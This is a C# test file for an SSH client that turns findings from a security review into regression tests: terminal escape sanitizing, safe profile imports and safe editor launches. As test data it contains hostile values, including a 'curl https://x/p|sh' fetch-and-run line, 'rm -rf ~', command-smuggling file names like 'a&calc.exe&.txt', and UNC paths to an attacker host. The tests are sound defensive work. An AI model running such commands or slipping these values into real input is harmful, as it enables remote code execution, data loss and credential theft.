using System.Text;
using System.Text.Json;
using NexusSSH.Core.Exchange;
using NexusSSH.Core.Localization;
using NexusSSH.Core.Models;
using NexusSSH.Core.Services;
using NexusSSH.Core.Settings;
using NexusSSH.Core.Terminals;
using NexusSSH.Core.ViewModels;

namespace NexusSSH.Core.Tests;

/// <summary>
/// Was der Sicherheitsdurchgang vom 2026-10-10 an den Vertrauensgrenzen gefunden hat – jeder Fund als Test, damit
/// er nicht wiederkommt. (Die Funde im Kern stehen dort: <c>tests/security.rs</c> und die Tests der Module.)
/// </summary>
[Collection(LanguageCollection.Name)]
public sealed class SecurityReviewTests
{
    public SecurityReviewTests() => L.Init(AppLanguage.English);

    private static string Plain(params string[] chunks)
    {
        var text = new PlainText();
        using var target = new MemoryStream();
        foreach (var chunk in chunks)
        {
            text.Append(Encoding.UTF8.GetBytes(chunk), target);
        }

        return Encoding.UTF8.GetString(target.ToArray());
    }

    [Fact]
    public void A_server_can_neither_blind_the_log_nor_write_what_never_was_on_screen()
    {
        // Eine Zeichenkette, die das Terminal abgebrochen hat (CAN, SUB), verschluckt nicht den Rest.
        Assert.Equal("danach", Plain("\e]0;titel\u0018danach"));
        Assert.Equal("danach", Plain("\eXgeheim\u001adanach"));

        // Ein neues ESC bricht die Zeichenkette ab und beginnt eine neue Folge.
        Assert.Equal("sichtbar", Plain("\e]0;titel\e[31msichtbar"));

        // BEL beendet nur OSC: Was in DCS, SOS, PM oder APC danach steht, zeigte das Terminal nie.
        Assert.Equal("ende", Plain("\ePkein\aText\e\\ende"));
        Assert.Equal("ende", Plain("\e_kein\aText\e\\ende"));

        // Folgen mit Zwischenzeichen (ESC ( B wählt einen Zeichensatz) hinterlassen nichts.
        Assert.Equal("text", Plain("\e(Btext"));

        // CSI: Abbruch und Neubeginn wie beim Terminal.
        Assert.Equal("a", Plain("\e[31\u0018a"));
        Assert.Equal("a", Plain("\e[31\e[0ma"));

        // Steuerzeichen als UTF-8 (C1), Zeilentrenner und Zeichen, die die Schreibrichtung umkehren, fallen weg –
        // auch über die Grenze zweier Blöcke; gewöhnliche Zeichen daneben bleiben.
        Assert.Equal("ab", Plain("a\u009bb"));
        Assert.Equal("rechnungfdp.exe", Plain("rechnung\u202efdp.exe"));
        Assert.Equal("ab", Plain("a\u2028\u2066b"));
        var split = Encoding.UTF8.GetBytes("a\u202eb€é–");
        var text = new PlainText();
        using var target = new MemoryStream();
        foreach (var value in split)
        {
            text.Append([value], target);
        }

        Assert.Equal("ab€é–", Encoding.UTF8.GetString(target.ToArray()));
    }

    [Fact]
    public void A_search_hit_cannot_reverse_its_line()
    {
        var hits = Assert.IsType<WebMessage.Hits>(TerminalMessages.Parse(
            """{"type":"hits","data":"pay","items":[{"id":"s1","row":3,"text":"pay \u202eevil\u0007 \u2066x"}]}"""));
        var hit = Assert.Single(hits.Items);
        Assert.DoesNotContain('\u202e', hit.Text);
        Assert.DoesNotContain('\u2066', hit.Text);
        Assert.DoesNotContain('\u0007', hit.Text);
        Assert.StartsWith("pay ", hit.Text, StringComparison.Ordinal);
    }

    [Fact]
    public void A_suggestion_is_one_line_without_control_characters()
    {
        // Aus einer importierten Datei: Der Name lädt zu „cd“ + Tab ein, der Text hätte zwei Zeilen ausgeführt.
        Assert.Equal("cd /tmp", TerminalMessages.SuggestedText("cd /tmp\ncurl https://x/p|sh\n"));
        Assert.Equal("ls -l", TerminalMessages.SuggestedText("ls\e -l\r\nrm -rf ~"));
        Assert.Equal(string.Empty, TerminalMessages.SuggestedText("\nrm -rf ~"));

        using var options = JsonDocument.Parse(TerminalMessages.Options(
            TerminalThemes.All[0],
            14,
            [],
            suggestions: [new Snippet("cd", "cd /tmp\ncurl https://x/p|sh\n", Run: false), new Snippet("leer", "\nx", Run: false)]));
        var suggestion = Assert.Single(options.RootElement.GetProperty("suggestions").EnumerateArray());
        Assert.Equal("cd /tmp", suggestion.GetProperty("text").GetString());
    }

    [Fact]
    public void The_bell_cannot_flood_the_user_with_notices()
    {
        var shell = TestShell.Create(out _);
        var now = new DateTimeOffset(2026, 10, 10, 12, 0, 0, TimeSpan.Zero);
        shell.Now = () => now;
        var notes = 0;
        shell.AttentionRequested += (_, _) => notes++;
        var session = shell.OpenSession(shell.Profiles[0]);

        for (var ring = 0; ring < 1000; ring++)
        {
            shell.OnTerminalBell(session);
        }

        Assert.Equal(1, notes);
        now += ShellViewModel.BellPause;
        shell.OnTerminalBell(session);
        Assert.Equal(2, notes);
    }

    [Fact]
    public void An_import_cannot_switch_on_agent_forwarding()
    {
        var existing = new ServerProfile("p1", "web", "web.example", 22, "deploy", "", []);
        var file = new ExportFile
        {
            Format = ExportFile.FormatName,
            Version = ExportFile.CurrentVersion,
            Profiles =
            [
                new ExportedProfile("p1", "web", "web.example", 22, "deploy", ForwardAgent: true),
                new ExportedProfile("p2", "new", "new.example", 22, "root", ForwardAgent: true),
            ],
        };

        var plan = DataExchange.Plan(file, [existing], new AppSettings(), "/home/a", keyExists: _ => true);
        Assert.All(plan.Profiles, planned => Assert.False(planned.Profile.ForwardAgent));
        Assert.Equal(ProfileChange.Unchanged, plan.Profiles[0].Change);

        // Wo es hier schon eingeschaltet ist, bleibt es.
        var kept = DataExchange.Plan(file, [existing with { ForwardAgent = true }], new AppSettings(), "/home/a", keyExists: _ => true);
        Assert.True(kept.Profiles[0].Profile.ForwardAgent);

        // Und ein Export schreibt es gar nicht erst hinein.
        var exported = DataExchange.Create([existing with { ForwardAgent = true }], new AppSettings(), "0.21.0", DateTimeOffset.UnixEpoch, "/home/a");
        Assert.False(Assert.Single(exported.Profiles!).ForwardAgent);
    }

    [Fact]
    public void An_import_that_redirects_a_profile_says_so_before_anything_happens()
    {
        var existing = new ServerProfile("p1", "web", "web.example", 22, "deploy", "", []);
        ExportFile File(string host, int port = 22, string user = "deploy", string? protocol = null) => new()
        {
            Format = ExportFile.FormatName,
            Version = ExportFile.CurrentVersion,
            Profiles = [new ExportedProfile("p1", "web", host, port, user, Protocol: protocol, Notes: "neu")],
        };

        // Eine geänderte Notiz ist eine Änderung, aber kein anderes Ziel.
        var harmless = DataExchange.Plan(File("WEB.example"), [existing], new AppSettings(), "/home/a", keyExists: _ => true);
        Assert.Equal((ProfileChange.Changed, false), (harmless.Profiles[0].Change, harmless.Profiles[0].Retargets));
        Assert.DoesNotContain(ShellViewModel.DescribeImport(harmless), line => line.Contains("Caution", StringComparison.Ordinal));

        // Anderer Host, Port, Benutzer oder ein anderes Protokoll: Die Rückfrage nennt das Profil und beide Ziele.
        foreach (var file in new[] { File("attacker.example"), File("web.example", 2222), File("web.example", 22, "root"), File("attacker.example", 21, "deploy", ServerProfile.Ftp) })
        {
            var plan = DataExchange.Plan(file, [existing], new AppSettings(), "/home/a", keyExists: _ => true);
            Assert.True(plan.Profiles[0].Retargets);
            var warning = Assert.Single(ShellViewModel.DescribeImport(plan), line => line.StartsWith("Caution", StringComparison.Ordinal));
            Assert.Contains("deploy@web.example", warning, StringComparison.Ordinal);
            Assert.Contains(plan.Profiles[0].Profile.Address, warning, StringComparison.Ordinal);
        }

        // Ein neues Profil leitet nichts um.
        var fresh = DataExchange.Plan(File("attacker.example"), [], new AppSettings(), "/home/a", keyExists: _ => true);
        Assert.False(fresh.Profiles[0].Retargets);
    }

    [Theory]
    [InlineData(@"\\attacker\share\key")]
    [InlineData("//attacker/share/key")]
    [InlineData(@"\\?\C:\Users\a\.ssh\id")]
    [InlineData(@"  \\attacker\share\key  ")]
    public void A_key_path_from_a_foreign_file_never_points_into_the_network(string path)
    {
        Assert.Null(DataExchange.LocalKeyPath(path, "/home/a"));

        // Schon das Nachsehen, ob es die Datei gibt, wäre eine Anmeldung bei dem fremden Server: Es geschieht nicht.
        var asked = new List<string>();
        var file = new ExportFile
        {
            Format = ExportFile.FormatName,
            Version = ExportFile.CurrentVersion,
            Profiles = [new ExportedProfile("p1", "web", "web.example", 22, "deploy", KeyPath: path)],
            Identities = [new ExportedIdentity("i1", "ops", "ops", path)],
        };
        var plan = DataExchange.Plan(file, [], new AppSettings(), "/home/a", keyExists: key =>
        {
            asked.Add(key);
            return true;
        });
        Assert.Null(plan.Profiles[0].Profile.KeyPath);
        Assert.All(plan.Identities, identity => Assert.Null(identity.KeyPath));
        Assert.Empty(asked);

        // Ebenso bei Sitzungen aus anderen Programmen.
        Assert.Null(new ForeignSession("PuTTY", "web", "web.example", 22, "deploy", "", KeyPath: path).ToProfile().KeyPath);
    }

    [Fact]
    public void Ordinary_key_paths_still_arrive()
    {
        Assert.Equal(@"C:\keys\id", DataExchange.LocalKeyPath(@"C:\keys\id", "/home/a"));
        Assert.Equal(Path.Combine("/home/a", ".ssh", "id"), DataExchange.LocalKeyPath("~/.ssh/id", "/home/a"));
        Assert.Equal(@"C:\keys\id", new ForeignSession("PuTTY", "web", "h", 22, "u", "", KeyPath: @"C:\keys\id").ToProfile().KeyPath);
        Assert.False(DataExchange.IsNetworkPath(@"C:\a"));
        Assert.False(DataExchange.IsNetworkPath("/home/a/.ssh/id"));
    }

    [Theory]
    [InlineData(@"C:\Temp\NexusSSH\edit-1\6f9c\notes.txt", true)]
    [InlineData(@"C:\Users\Jörg Müller\Temp\a b\readme-1_2.md", true)]
    [InlineData(@"C:\Temp\a&calc.exe&.txt", false)]
    [InlineData(@"C:\Temp\%COMSPEC%.txt", false)]
    [InlineData(@"C:\Temp\a^b.txt", false)]
    [InlineData(@"C:\Temp\a(b).txt", false)]
    [InlineData(@"C:\Temp\a;b.txt", false)]
    [InlineData(@"C:\Temp\a!b.txt", false)]
    public void A_script_as_editor_only_gets_names_without_anything_cmd_would_read(string path, bool plain)
        => Assert.Equal(plain, ProcessEditorHost.IsPlainPath(path));

    [Fact]
    public void An_editor_script_is_not_started_with_a_name_that_carries_a_command()
    {
        var folder = Directory.CreateTempSubdirectory("nexus-sec-");
        try
        {
            // Ein Skript, das eine Spur hinterließe, wenn es liefe – es läuft nicht: Der Name trägt ein „&“.
            var script = Path.Combine(folder.FullName, "editor.cmd");
            File.WriteAllText(script, "@echo ran> \"%~dp0ran.txt\"\r\n");
            var hostile = Path.Combine(folder.FullName, "a&b.txt");
            File.WriteAllText(hostile, "x");
            var host = new ProcessEditorHost(() => script);

            Assert.False(host.Launch(hostile));
            Assert.False(File.Exists(Path.Combine(folder.FullName, "ran.txt")));

            // Statt einer Datei ein Verzeichnis: wird keinem Editor übergeben.
            Assert.False(new ProcessEditorHost(() => "definitely-not-a-program.exe").Launch(folder.FullName));
        }
        finally
        {
            folder.Delete(recursive: true);
        }
    }

    [Theory]
    [InlineData("web*", "web01", true)]
    [InlineData("*", "", true)]
    [InlineData("10.0.?.1", "10.0.5.1", true)]
    [InlineData("10.0.?.1", "10.0.55.1", false)]
    [InlineData("*.example.org", "a.b.example.org", true)]
    [InlineData("a*b*c", "aXXbYYc", true)]
    [InlineData("a*b*c", "aXXbYY", false)]
    [InlineData("WEB*", "web01", true)]
    [InlineData("*a", "banana", true)]
    [InlineData("*ab", "aab", true)]
    [InlineData("", "", true)]
    [InlineData("", "a", false)]
    public void Host_patterns_match_as_before(string pattern, string name, bool expected)
        => Assert.Equal(expected, ForeignFiles.Matches(pattern, name));

    [Fact]
    public void A_pattern_full_of_stars_does_not_hang_the_import()
    {
        // Früher kostete jeder Stern ein Vielfaches – so eine Zeile in einer fremden Datei hielt die App an.
        var pattern = string.Concat(Enumerable.Repeat("*a", 120));
        var name = new string('a', 250) + "b";
        var watch = System.Diagnostics.Stopwatch.StartNew();
        Assert.False(ForeignFiles.Matches(pattern + "c", name));
        Assert.True(watch.Elapsed < TimeSpan.FromSeconds(2), watch.Elapsed.ToString());
    }
}
